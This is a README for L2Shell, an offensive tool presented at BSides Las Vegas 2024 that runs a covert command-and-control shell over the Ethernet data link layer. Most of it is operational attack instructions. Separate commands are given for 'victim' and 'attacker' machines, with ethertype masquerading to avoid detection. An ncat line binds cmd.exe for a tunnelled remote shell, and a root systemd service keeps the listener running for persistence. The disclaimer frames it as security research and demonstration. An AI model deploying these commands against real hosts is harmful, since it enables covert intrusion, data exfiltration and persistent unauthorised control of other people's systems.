# L2Shell
BSides Presentation: LOLS: LO level Shells - Party Trick or Defenders Nightmare?

https://bsideslv.org/talks#ABCJ83

#### Important Disclaimer
L2Shell is a tool that was created and demonstrated for BSides Las Vegas 2024. The proof of concept, and versions thereafter should be used ethically and with permission from involved parties. It is suggested to abide by applicable and local laws. The researcher does not take responsibility in the distribution, modification, or usage of this code.

While L2Shell is a tool and combination of techniques that demonstrate covert communication, data smuggling and exfiltration with a focus on C2 capabilities specifically on data link layer, it is for demonstration and testing purposes. 

Other researchers, academic papers, and existing tools were referenced and consulted in preparation of the BSides LV conference. 

It is the researchers observation that this technique is consistent with ethernet communication since ethernets' creation, meaning this functionality could be used on all major network implementations that support those standards, being agnostic to both system and infrastructure.

With that, it is recommended that any network and operations stakeholders evaluate the threat that may result from this tool independently.


### Requirements
- pcap
- scapy

## L2Shell Usage
```
python l2shell.py -h
```

### On victim machine:
```
python l2shell.py -l -a <attacker_id> -s <session_id>
```

### On Attacker machine
```
python l2shell.py -c -a <attacker_id> -s <session_id>
```

### Sending command (from attacker host)
```
> <command>
```

### enable options (from attacker host)
```
> enable options
```

### Changing framesize (victim)
```
python l2shell.py -l -f <frame_size> -a <attacker_id> -s <session_id>
```

### Changing chunked request delay (victim)
```
python l2shell.py -l -d <delay> -a <attacker_id> -s <session_id>
```

### Connect to Victim via Mac address - Victim responds with broadcasts
```
python l2shell.py -c/-l -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
```

### Change interface
```
python l2shell.py -c/-l -a <attacker_id> -s <session_id> -i <interface guid>
```

### setup interface
```
python l2shell.py -c -a <attacker_id> -s <session_id> -si
```

### Ethertype Masquerading 
```
python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
python l2shell.py -l -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF>
python l2shell.py -c -a <attacker_id> -s <session_id> -et <0x0000-0xFFFF> -p
```

## L2Tunnel - Tunneling Netcat
### Attacker Machine
```
python l2shell.py -c -a <attacker_id> -s <session_id> -p
```
```
ncat.exe 127.0.0.1 1111 --source-port 2223 -u
```
### Victim Node Machine
```
python l2shell.py -l -a <attacker_id> -s <session_id> -p
```
```
ncat.exe -lvnp 2223 -u -e cmd.exe
```
`note: The proxy option [-p] [--proxy] opens local ports 1111 and 2222`

## Linux Persistence via Service
```
/etc/systemd/system
sudo nano l2service.server
```
```
[Unit]
Description=L2Shell Listener Service
After=network.target

[Service]
ExecStart=python3 /tmp/L2Shell-main/l2shell.py -l -a att123 -s sess123
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```
### Now enable the service
```
sudo systemctl daemon-reload
sudo systemctl start l2service.service
sudo systemctl enable l2service.service
```
